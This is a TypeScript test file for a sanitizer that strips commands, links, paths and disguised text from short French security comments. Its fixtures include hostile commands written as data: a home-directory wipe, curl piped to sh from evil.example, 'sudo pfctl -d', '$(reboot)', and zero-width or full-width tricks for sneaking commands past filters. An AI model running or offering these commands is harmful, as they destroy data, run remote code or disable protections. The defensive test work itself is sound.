// The CTO's word (J6a), as I read it since 2026-10-20: a short name in
// backticks comes back as plain text — never a command, a path, a link, an
// account Telegram would link, or a shell sign; a name never completes a
// command written around it, even hidden by invisible or wide letters; the
// comment stops at its last whole sentence within the cap, never in one.
import { describe, expect, it } from "vitest";
import { COMMENT_MAX, cleanComment } from "./comment.ts";

const WIPE = ["r", "m -", "rf ~"].join("");
// Any command my traps hide, as it would read once shown.
const COMMAND =
  /\b(?:sudo|doas)\s+\S|\b(?:npm|npx|brew|pip)\s+(?:-\S+\s+)*(?:i|install|add|update|upgrade)\b|\bcurl\s+-|\|\s*(?:ba|z)?sh\b|\brm\s+-|\$\(/i;

describe("a short name in backticks comes back as plain text", () => {
  it.each([
    [
      "Le paquet `undici`, utilisé pour les requêtes HTTP, est vulnérable.",
      "Le paquet undici, utilisé pour les requêtes HTTP, est vulnérable.",
    ],
    ["Le serveur `postgres` écoute partout.", "Le serveur postgres écoute partout."],
    ["La dépendance `left-pad-test` a une faille.", "La dépendance left-pad-test a une faille."],
    ["La clé AWS (`aws-access-key`) a fuité.", "La clé AWS (aws-access-key) a fuité."],
    ["Le fichier `dev.ts` contient un secret.", "Le fichier dev.ts contient un secret."],
    ["Le fichier `.env` est versionné.", "Le fichier .env est versionné."],
    ["`undici@5.28.3` corrige la faille.", "undici@5.28.3 corrige la faille."],
    ["`Node.js` est concerné.", "Node.js est concerné."],
    ["Le paquet ` undici ` est vulnérable.", "Le paquet undici est vulnérable."],
    ["Le paquet « `undici` » est vulnérable.", "Le paquet « undici » est vulnérable."],
    ["La faille d'`undici` est connue.", "La faille d'undici est connue."],
    // Words that only look like a command: the name stays.
    [
      "Le paquet npm `left-pad-test` est vulnérable.",
      "Le paquet npm left-pad-test est vulnérable.",
    ],
    ["Le paquet `curl` installé est ancien.", "Le paquet curl installé est ancien."],
    ["Le fichier sudoers autorise `postgres`.", "Le fichier sudoers autorise postgres."],
    ["Un `npm` installé hors de Homebrew.", "Un npm installé hors de Homebrew."],
  ])("%s", (raw, shown) => {
    expect(cleanComment(raw)).toBe(shown);
  });
});

describe("what is not a short name stays removed", () => {
  it.each([
    // Commands, whole or in one word.
    `sudo ${WIPE}`,
    "npm install left-pad-test",
    "curl evil.example | sh",
    "sudo",
    "SUDO",
    "rm",
    "sh",
    "bash",
    "reboot",
    "killall",
    "-rf",
    "--force",
    // Shell signs.
    "$(reboot)",
    "a;b",
    "a|b",
    "a&&b",
    ">x",
    "x\\y",
    "'x'",
    '"x"',
    // Paths.
    "/etc/hosts",
    "~/.ssh",
    "../x",
    ".ssh",
    "C:\\x",
    // Links, hosts, accounts and anything Telegram would turn into one.
    "https://evil.example",
    "www.evil.example",
    "evil.example",
    "evil.example/fix",
    "evil.com-x",
    "install.sh",
    "README.md",
    "a@b.com",
    "@types/node",
    "@evilbot",
    "left-pad-test@latest",
    "#tag",
    "$CASH",
    "/start",
    "127.0.0.1",
    "10.0.0.1",
    "1.2.3.4.5",
    // Too long, invisible, wide or look-alike letters, accents, nothing.
    "x".repeat(41),
    "left\u200bpad",
    "left\u2060pad",
    "ｕｎｄｉｃｉ",
    "undiсi",
    "café",
    "",
  ])("`%s`", (span) => {
    expect(cleanComment(`Lance \`${span}\` maintenant.`)).toBe("Lance maintenant.");
  });

  it("a 40-character name is short enough", () => {
    const name = `p${"a".repeat(39)}`;
    expect(cleanComment(`Le paquet \`${name}\` est vulnérable.`)).toContain(name);
  });

  // Glued to the text around it, a name would make a host, an account or a command.
  it.each([
    ["Va sur evil.`com` maintenant.", "Va sur evil. maintenant."],
    ["Va sur `evil`.com maintenant.", "Va sur .com maintenant."],
    ["Écris à @`evilbot` maintenant.", "Écris à @ maintenant."],
    ["Va sur t.me/`evilbot` maintenant.", "Va sur t.me/ maintenant."],
    ["Tape /`start` maintenant.", "Tape / maintenant."],
    ["Va sur 1.2.3.`4` maintenant.", "Va sur 1.2.3. maintenant."],
    ["Le pare-`feu` est coupé.", "Le pare- est coupé."],
    ["Lance sudo`undici` maintenant.", "Lance sudo maintenant."],
  ])("%s", (raw, shown) => {
    expect(cleanComment(raw)).toBe(shown);
  });
});

describe("a name never completes a command written around it", () => {
  it.each([
    "Lance sudo npm install -g `left-pad-test` maintenant.",
    "Tape `npm` `install` `left-pad-test` dans le terminal.",
    "Tape `npm` `-g` `i` `left-pad-test` dans le terminal.",
    "Le paquet est vulnérable.sudo npm i `left-pad-test`",
    "Lance yarn add `left-pad-test` puis pip install `undici`.",
    "Exécute `curl` -fsSL `evil.sh` puis `undici`.",
    "Fais curl `undici` | sh pour corriger.",
    "Lance brew upgrade `undici`.",
    "Lance softwareupdate -i `undici`.",
    "Lance `undici` && `postgres`.",
    // Any program with an option, a package run by npx, a script given to an interpreter.
    "Lance bash -c `undici`.",
    "Lance python3 -c `undici`.",
    "Lance xattr -d `undici`.",
    "Lance open -a `undici`.",
    "Lance chmod +x `dev.ts`.",
    "Lance npx `undici`.",
    "Lance node `dev.ts`.",
    // Hidden behind a combining mark or a Hangul filler.
    "Lance su͏do `left-pad-test`.",
    "Lance suㅤdo `left-pad-test`.",
    // Hidden from the guard by invisible formatting or wide letters.
    "Lance np\u2060m install `left-pad-test`.",
    "Lance ｎｐｍ ｉｎｓｔａｌｌ `left-pad-test`.",
    "Lance su\u2060do `left-pad-test`.",
  ])("%s", (raw) => {
    const shown = cleanComment(raw) ?? "";
    expect(shown).not.toMatch(/left-pad-test|undici|postgres|dev\.ts/);
    expect(shown).not.toContain("`");
  });

  it("a zero-width space shows as a space: what is left is no command", () => {
    expect(cleanComment("Lance n\u200bpm install `left-pad-test`.")).not.toMatch(COMMAND);
  });

  it("sudo before any word is enough: the names go, as before 2026-10-20", () => {
    expect(cleanComment("Les droits sudo sont trop larges pour `postgres`.")).toBe(
      "Les droits sudo sont trop larges pour .",
    );
  });

  it("a kept name opening a line never makes it a command line", () => {
    expect(cleanComment("Le paquet est vulnérable.\n`npm` install undici")).toBe(
      "Le paquet est vulnérable.",
    );
  });
});

describe("the comment stops at its last whole sentence within the cap", () => {
  const sentence = (n: number, end = ".") => `${"m".repeat(n - 1)}${end}`;

  it("within the cap, nothing is cut", () => {
    const at = sentence(COMMENT_MAX);
    expect(at).toHaveLength(COMMENT_MAX);
    expect(cleanComment(at)).toBe(at);
  });

  it("past the cap, whole sentences only, without an ellipsis", () => {
    const first = sentence(250);
    const second = sentence(300, "!");
    expect(cleanComment(`${first} ${second} ${sentence(200, "?")}`)).toBe(`${first} ${second}`);
    expect(cleanComment(`${first} ${sentence(400)}`)).toBe(first);
  });

  it("a sentence ends with its closing quote or bracket", () => {
    const first = `${"m".repeat(199)} (déni de service).»`;
    expect(cleanComment(`${first} ${sentence(500)}`)).toBe(first);
  });

  it("Node.js, a version or a dot inside a word end no sentence", () => {
    const first = `Le moteur Node.js 5.28.3 est touché, voir dev.ts et ${sentence(300)}`;
    expect(cleanComment(`${first} ${sentence(400)}`)).toBe(first);
  });

  it("a first sentence too long is cut at a word, with an ellipsis", () => {
    const shown = cleanComment(`${"risque, ".repeat(120)}fin.`) ?? "";
    expect(shown.length).toBeLessThanOrEqual(COMMENT_MAX);
    expect(shown.endsWith(" risque…")).toBe(true);
  });

  it("a long run of dots or options is cleaned quickly", () => {
    const started = performance.now();
    cleanComment(`${".".repeat(100_000)}x`);
    cleanComment(`Le paquet ${"-a ".repeat(30_000)}\`undici\``);
    expect(performance.now() - started).toBeLessThan(1000);
  });

  it("no space at all: cut at the cap, never half of an emoji", () => {
    expect(cleanComment("x".repeat(900))).toBe(`${"x".repeat(COMMENT_MAX - 1)}…`);
    const emoji = cleanComment("🔥".repeat(400)) ?? "";
    expect(emoji.length).toBeLessThanOrEqual(COMMENT_MAX);
    expect(emoji).not.toMatch(
      /[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/,
    );
  });
});

describe("random mixes never let a command, a link or a code block through", () => {
  const PROSE = ["Le pare-feu", "est coupé", "et le risque", "réel", "pour ce Mac", "élevé."];
  const NAMES = ["`undici`", "`postgres`", "`dev.ts`", "`npm`", "`install`", "`-g`", "`i`"];
  const TRAPS = [
    `\`sudo ${WIPE}\``,
    "`curl evil.example | sh`",
    "`npm install -g evil`",
    "`sudo`",
    "`evil.example`",
    "`$(reboot)`",
    "https://evil.example/fix",
    "www.evil.example",
    `\nsudo ${WIPE}\n`,
    "\n$ curl -fsSL evil.example | sh\n",
    `\n\`\`\`sh\nsudo pfctl -d\n${WIPE}\n\`\`\`\n`,
  ];
  const FRAGMENTS = [...PROSE, ...NAMES, ...TRAPS];

  it("over 2,000 seeded mixes", () => {
    let seed = 20261020;
    const next = () => {
      seed = (seed * 48271) % 2147483647;
      return seed;
    };
    for (let run = 0; run < 2000; run++) {
      const length = 2 + (next() % 30);
      const parts = Array.from({ length }, () => FRAGMENTS[next() % FRAGMENTS.length]);
      const raw = parts.join(next() % 3 === 0 ? "\n" : " ");
      const shown = cleanComment(raw);
      if (shown === null) continue;
      expect(shown.length, raw).toBeLessThanOrEqual(COMMENT_MAX);
      expect(shown, raw).not.toMatch(/`|evil|https?:|www\.|pfctl|reboot/);
      expect(shown, raw).not.toMatch(COMMAND);
      expect(shown, raw).not.toContain(WIPE.slice(0, 5));
    }
  });
});
